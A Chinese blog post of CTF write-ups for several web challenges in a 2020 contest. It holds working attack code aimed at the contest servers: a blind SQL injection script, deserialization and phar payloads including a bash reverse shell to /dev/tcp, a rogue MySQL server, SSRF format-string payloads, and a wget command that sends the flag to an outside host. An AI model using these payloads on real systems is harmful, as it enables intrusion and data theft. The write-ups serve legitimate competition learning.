---
title: 2020 高校战“疫”网络安全分享赛部分WEB WriteUp
tags:
  - CTF
  - WriteUp
date: 2020-03-09 20:42:59
toc: true
---

这周末遇上高校战“疫”赛，打了两天，这里记录一下做的和参与做的几道题
<!-- more -->

## easy_trick_gzmtu

传入2020 和Y都能查出结果，传入y20，yy，20y也可以，
猜测后端对参数做了date()转换，用\可以使date后的字符串不变，于是构造盲注脚本
```python
import requests

se = requests.Session()

pl = r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'
pl = r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\t\a\b\l\e_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\t\a\b\l\e\s \w\h\e\r\e \t\a\b\l\e_\s\c\h\e\m\a=\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'
pl = r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\c\o\l\u\m\n_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\c\o\l\u\m\n\s%%20\w\h\e\r\e%%20\t\a\b\l\e_\n\a\m\e=%%27\a\d\m\i\n%%27),%d,1)))=%d%%23'
pl = r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\u\r\l)%%20\f\r\o\m%%20\a\d\m\i\n),%d,1)))=%d%%23'
text = ''

for x in xrange(1,50):
        for y in xrange(33,126):
                res = se.get(pl % (x,y))
                if 'Hello World --Brian Kernighan' in res.content:
                        text += chr(y)
                        print text
                        break
```
注入出一个admin用户
```http
账号 admin
密码 20200202goodluck
URL：http://121.37.181.246:6333/eGlhb2xldW5n/
```
有个读文件的地方，限制了只能本地读取文件，发现`file://localhost/`可以绕过
```http
http://121.37.181.246:6333/eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php
```
```php
<?php

class trick{
	public $gf;
	public function content_to_file($content){	
		$passwd = $_GET['pass'];
		if(preg_match('/^[a-z]+\.passwd$/m',$passwd)) 
	{ 

		if(strpos($passwd,"20200202")){
			echo file_get_contents("/".$content);

		}

		 } 
		}
	public function aiisc_to_chr($number){
		if(strlen($number)>2){
		$str = "";
		 $number = str_split($number,2);
		 foreach ($number as $num ) {
		 	$str = $str .chr($num);
		 }
		 return strtolower($str);
		}
		return chr($number);
	}
	public function calc(){
		$gf=$this->gf;
		if(!preg_match('/[a-zA-z0-9]|\&|\^|#|\$|%/', $gf)){
		  	eval('$content='.$gf.';');
		  	$content =  $this->aiisc_to_chr($content); 
		  	return $content;
		}
	}
	public function __destruct(){
        $this->content_to_file($this->calc());
        
    }
	
}
unserialize((base64_decode($_GET['code'])));

?>
```
最后反序列化读flag
```http
http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoyMzoifsfJycrHzcvIy8nLycvIyM/IycnKyM4iO30=&pass=a.passwd%0a20200202
```

## webct
有个上传文件的点，和一个连接mysql数据库的点
mysql数据库传入的option参数可控，将其设置为8可以开启MYSQLI_OPT_LOCAL_INFILE。
但是直接读文件失败了，想到构造phar文件让msyql去读取触发反序列化
```php
<?php
class Fileupload
{
    public $file;
}

class Listfile
{
    public $file;
}

$payload=new Listfile();
$payload->file='$(bash -c "bash -i >& /dev/tcp/ip/1234 0>&1")';
$file=new Fileupload();
$file->file=$payload;
unlink("./phar.phar");
$phar = new Phar("./phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($file);
$phar->addFromString("test.txt", "test");

$phar->stopBuffering();
echo urlencode(serialize($file));
?>
```
上传之后直接用MysqlRouge触发反序列化即可，
```python
coding=utf-8 
import socket
import logging
logging.basicConfig(level=logging.DEBUG)

filename="phar:////var/www/html/uploads/846c8ebb95a1fc1828e4fcc14a8902e0/b4bc4fd46f0e346f2bd105c93c5a1b20.jpg"
sv=socket.socket()
sv.bind(("",3309))
sv.listen(5)
conn,address=sv.accept()
logging.info('Conn from: %r', address)
conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
conn.recv(9999)
logging.info("auth okay")
conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
conn.recv(9999)
logging.info("want file...")
wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
conn.sendall(wantfile)
content=conn.recv(9999)
logging.info(content)
conn.close()
```

payload：
```http
ip=ip:port&user=user&password=passsword&option=8
```

最后/readflag
```
flag：flag{bfa7ea9865f08c320abab5323a1b522c1}
```

## fmkq
审计代码发现可以构造SSRF
http://121.37.179.47:1101/?head=\&url=xxx.xxx.xxx.xxx

发现
```php
extract($_GET);
echo sprintf($begin.'%d',$output);
```
传入`begin=%s%`，可以读到output，于是得到有回显SSRF
扫描内网发现8080端口开放
![fmkq](/img/fmkq1.png)
```http
/?url=http://localhost:8080/read/file=/etc/passwd%26vipcode%3d0&head=\&begin=%s%
```
通过这个接口自带的列目录功能可以发现flag在

但是不能直接读
但是如果file参数传入{file}时会被解析成error，尝试{file.__class__}之后确定后端为python且存在格式化字符串漏洞

存用
```http
/?url=http://localhost:8080/read/file={file.__class__.__init__.__globals__[vip].__init__.__globals__}%26vipcode={file}&head=\&begin=%s%
```
可读取到vipcode的值
```http
'vipcode': 'uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL
```
有了vipcode可以读取源码和列目录，知道flag在`/fl4g_1s_h3re_u_wi11_rua`里，但是读不了，于是读取项目代码，如下：

/app/base/readfile.py
```python
from .vip import vip
import re
import os


class File:
    def __init__(self,file):
        self.file = file

    def __str__(self):
        return self.file

    def GetName(self):
        return self.file


class readfile():

    def __str__(self):
        filename = self.GetFileName()
        if '..' in filename or 'proc' in filename:
            return "quanbumuda"
        else:
            try:
                file = open("/tmp/" + filename, 'r')
                content = file.read()
                file.close()
                return content
            except:
                return "error"

    def __init__(self, data):
        if re.match(r'file=.*?&vipcode=.*?',data) != None:
            data = data.split('&')
            data = {
                data[0].split('=')[0]: data[0].split('=')[1],
                data[1].split('=')[0]: data[1].split('=')[1]
            }
            if 'file' in data.keys():
                self.file = File(data['file'])

            if 'vipcode' in data.keys():
                self.vipcode = data['vipcode']
            self.vip = vip()


    def test(self):
        if 'file' not in dir(self) or 'vipcode' not in dir(self) or 'vip' not in dir(self):
            return False
        else:
            return True

    def isvip(self):
        if self.vipcode == self.vip.GetCode():
            return True
        else:
            return False

    def GetFileName(self):
        return self.file.GetName()


current_folder_file = []


class vipreadfile():
    def __init__(self,readfile):
        self.filename = readfile.GetFileName()
        self.path = os.path.dirname(os.path.abspath(self.filename))
        self.file = File(os.path.basename(os.path.abspath(self.filename)))
        global current_folder_file
        try:
            current_folder_file = os.listdir(self.path)
        except:
            current_folder_file = current_folder_file

    def __str__(self):
        if 'fl4g' in self.path:
            return 'nonono,this folder is a secret!!!'
        else:
            output = '''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''
            filepath = (self.path + '/{vipfile}').format(vipfile=self.file)
            output += filepath
            output += '\r\n\r\nThe content is:\r\n'
            try:
                f = open(filepath,'r')
                content = f.read()
                f.close()
            except:
                content = 'can\'t read'
            output += content
            output += '\r\n\r\nOther files under the same folder:\r\n'
            output += ' '.join(current_folder_file)
            return output
```     
/app/base/vip.py
```python
import random
import string


vipcode = ''


class vip:
    def __init__(self):
        global vipcode
        if vipcode == '':
            vipcode = ''.join(random.sample(string.ascii_letters+string.digits, 48))
            self.truevipcode = vipcode
        else:
            self.truevipcode = vipcode

    def GetCode(self):
        return self.truevipcode
```
/app/app.py
```python
import web
from urllib.parse import unquote
from base.readfile import *

urls = (
    '/', 'help',
    '/read/(.*)','read'
)
web.config.debug = False

class help:
    def GET(self):
        help_information = '''
        Welcome to our FMKQ api, you could use the help information below
        To read file:
            /read/file=example&vipcode=example
            if you are not vip,let vipcode=0,and you can only read /tmp/{file}
        Other functions only for the vip!!!
        '''
        return help_information

class read:
    def GET(self,text):
        file2read = readfile(text)
        if file2read.test() == False:
            return "error"
        else:
            if file2read.isvip() == False:
                return ("The content of "+ file2read.GetFileName() +" is {file}").format(file=file2read)
            else:
                vipfile2read = vipreadfile(file2read)
                return (str(vipfile2read))
if __name__ == "__main__":
    app = web.application(urls, globals())
    app.run()
```

path中不能有fl4g，但是读取flag必定会吧上一级当成path，
发现vipfile和file一样存在格式化字符串漏洞，想到构造一个f绕过对fl4g的过滤，
payload:
```http
/?url=http://localhost:8080/read/file={vipfile.__class__.__init__.__globals__[vipreadfile].__module__[9]}l4g_1s_h3re_u_wi11_rua/flag%26vipcode=uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL&head=\&begin=%s%
```

flag:
flag{qoSF2nKvwoGRI7aJ}

## Dooog
通读代码，看起来是个kerberos协议
核心就是伪造一个时间戳，绕过对cmd的验证
![dooog](/img/dooog1.png)
然后直接/readflag
exp：
```python
if __name__ == '__main__':
    username ="xishir"
    master_key = "12345678"
    cmd = "wget xxxx/`/readflag`"
    cryptor = AESCipher(master_key)
    authenticator = cryptor.encrypt(json.dumps({'username':username, 'timestamp': int(time.time())}))
    res = requests.post('http://121.37.164.32:5001/getTGT', data={'username': username, 'authenticator': base64.b64encode(authenticator)})
    print res.text
    session_key, TGT = cryptor.decrypt(base64.b64decode(res.content.split('|')[0])), res.content.split('|')[1]
    cryptor = AESCipher(session_key)
    authenticator = cryptor.encrypt(json.dumps({'username': username, 'timestamp': int(time.time())-61}))
    res = requests.post('http://121.37.164.32:5001/getTicket',  data={'username': username, 'cmd': cmd, 'authenticator': base64.b64encode(authenticator), 'TGT': TGT})
    print res.text
    client_message, server_message = res.content.split('|')

    session_key = cryptor.decrypt(base64.b64decode(client_message))
    
    cryptor = AESCipher(session_key)
    authenticator = base64.b64encode(cryptor.encrypt(username))
    res = requests.post('http://121.37.164.32:5002/cmd', data={'server_message': server_message, 'authenticator': authenticator})
```


## GuessGame
http://121.37.179.47:8081/static/app.js 有后端源码

用`ADmin888`大小写绕过admin的检查，
merge存在原型链污染，可以把config.enableReg改成true，
构造
```
{"user":{"username":"ADmin888","__proto__": {"enableReg": true}}}
```
然后可以控制进行一次正则匹配，因为没有任何回显，猜测是要redos进行延时盲注
![guess](/img/guess.png)

exp:
```python
import requests
import time

flag = "g3"
ext = "zY"
for i in range(50):
    alls = []
    for f in "{}_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
        t = time.time()
        headers = {'Content-Type': 'application/json'}
        payload = """{"q":"^((.*)+)+[^%s]%s$","tmp":"%d"}""" % (f, ext, t)
        #payload = """{"q":"^(((.*)+?)+?)+?[^%s]%s$","tmp":"%d"}""" % (f, ext, t)
        #print payload
        r = requests.post(url="http://121.37.179.47:8081/verifyFlag", headers=headers, data=payload)
        tt = time.time() - t
        alls.append({"time":tt,"v":f})
        print f,tt,r,len(r.text),payload

    alls.sort()
    ext = alls[-1]["v"] + ext
    print alls[-3:]
    print i, flag, ext
```
我做这题的时候服务器一触发redos就挂，挂一台跑一位出来（运维大哥别打我
最后跑出结果`g3tFLAaGEAxY`，拿了一血。
flag：flag{g3tFLAaGEAxY}

后来发现题目超时就断开了，更容易跑了。。


## PHP-UAF
PHP 7.4.2，直接用现成exp打
https://github.com/mm0r1/exploits 
![uaf1](/img/uaf1.png)
![uaf2](/img/uaf2.png)

## happyvacation
http://159.138.4.209:1002/.git git泄露源码 
审计代码发现答题的地方有个eval，answer参数有几个过滤，不能直接命令注入
![hv1](/img/hv1.png)
但是看到this->user引入了上一层的$user，想到另外还有个上传点，于是构造
![hv2](/img/hv2.png)
把uploader中的上传后缀黑名单清除，就能上传php文件了
![hv3](/img/hv3.png)
![hv4](/img/hv4.png)
最后直接读取/flag
![hv5](/img/hv5.png)

所以提示里的bot是啥玩意？

自欺欺人md5验证码又是啥玩意？
![hv6](/img/hv6.png)

## 后记
又是好久没有这么肝一场比赛了，最后拿了第二名，给队里的师傅们递茶！
